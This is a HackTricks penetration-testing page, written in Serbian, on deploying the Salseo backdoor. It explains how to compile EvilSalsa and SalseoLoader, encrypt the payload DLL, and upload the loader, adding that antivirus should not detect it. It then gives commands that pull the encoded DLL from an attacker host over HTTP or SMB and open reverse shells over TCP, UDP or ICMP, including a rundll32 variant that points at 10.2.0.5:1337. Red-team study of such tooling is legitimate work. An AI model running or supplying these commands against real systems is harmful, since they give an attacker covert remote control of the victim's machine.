# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kompajliranje binarnih fajlova

Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Biće vam potreban **Visual Studio** instaliran da biste kompajlirali kod.

Kompajlirajte te projekte za arhitekturu Windows mašine na kojoj ćete ih koristiti (Ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).

Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" tabu** u **"Platform Target".**

(\*\*Ako ne možete pronaći ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Zatim, izgradite oba projekta (Build -> Build Solution) (Unutar logova će se pojaviti putanja do izvršnog fajla):

![](<../.gitbook/assets/image (381).png>)

## Pripremite Backdoor

Prvo, biće potrebno da kodirate **EvilSalsa.dll.** Da biste to uradili, možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **encoded EvilDalsa.dll** i **binary of SalseoLoader.**

**Otpremite SalseoLoader.exe binarni fajl na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**

## **Izvršite backdoor**

### **Dobijanje TCP reverse shell-a (preuzimanje kodiranog dll-a putem HTTP-a)**

Zapamtite da pokrenete nc kao slušalac reverse shell-a i HTTP server da poslužite kodirani evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Dobijanje UDP reverzibilne ljuske (preuzimanje kodirane dll preko SMB)**

Zapamtite da pokrenete nc kao slušača reverzibilne ljuske, i SMB server da posluži kodirani evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Dobijanje ICMP obrnute ljuske (kodirana dll već unutar žrtve)**

**Ovoga puta vam je potreban poseban alat na klijentu da primite obrnutu ljusku. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Onemogućite ICMP odgovore:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Izvrši klijenta:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Unutar žrtve, hajde da izvršimo salseo stvar:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompajliranje SalseoLoader-a kao DLL koji izvozi glavnu funkciju

Otvorite SalseoLoader projekat koristeći Visual Studio.

### Dodajte pre glavne funkcije: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Instalirajte DllExport za ovaj projekat

#### **Alati** --> **NuGet Package Manager** --> **Upravljanje NuGet paketima za rešenje...**

![](<../.gitbook/assets/image (881).png>)

#### **Pretražite DllExport paket (koristeći Browse tab), i pritisnite Instaliraj (i prihvatite iskačući prozor)**

![](<../.gitbook/assets/image (100).png>)

U vašem projektnom folderu su se pojavili fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**

### **De**instalirajte DllExport

Pritisnite **Deinstaliraj** (da, čudno je, ali verujte mi, to je neophodno)

![](<../.gitbook/assets/image (97).png>)

### **Izađite iz Visual Studio i izvršite DllExport\_configure**

Jednostavno **izađite** iz Visual Studio

Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**

Izaberite **x64** (ako planirate da ga koristite unutar x64 okvira, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**

![](<../.gitbook/assets/image (882).png>)

### **Ponovo otvorite projekat sa Visual Studio**

**\[DllExport]** više ne bi trebao biti označen kao greška

![](<../.gitbook/assets/image (670).png>)

### Izgradite rešenje

Izaberite **Tip izlaza = Klasa biblioteka** (Projekat --> SalseoLoader Svojstva --> Aplikacija --> Tip izlaza = Klasa biblioteka)

![](<../.gitbook/assets/image (847).png>)

Izaberite **x64** **platformu** (Projekat --> SalseoLoader Svojstva --> Izgradnja --> Ciljna platforma = x64)

![](<../.gitbook/assets/image (285).png>)

Da **izgradite** rešenje: Izgradnja --> Izgradi rešenje (Unutar izlazne konzole će se pojaviti putanja novog DLL-a)

### Testirajte generisani DLL

Kopirajte i nalepite DLL gde želite da ga testirate.

Izvršite:
```
rundll32.exe SalseoLoader.dll,main
```
Ako se ne pojavi greška, verovatno imate funkcionalni DLL!!

## Dobijanje shel-a koristeći DLL

Ne zaboravite da koristite **HTTP** **server** i postavite **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
